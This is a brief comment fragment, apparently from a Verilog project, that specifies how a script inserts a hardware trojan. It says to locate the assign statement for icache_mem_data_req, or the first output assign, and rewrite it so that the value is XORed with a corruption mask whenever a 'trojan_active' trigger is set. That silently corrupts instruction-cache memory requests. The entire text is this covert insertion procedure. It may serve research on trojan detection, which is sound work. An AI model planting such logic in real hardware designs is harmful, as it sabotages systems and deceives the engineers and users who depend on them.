...
//
// IMPORTANT: icache_mem_data_req may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If icache_mem_data_req is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for icache_mem_data_req (or first output assign):
//     assign icache_mem_data_req = <expr>;
//   Replace with:
//     assign icache_mem_data_req = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
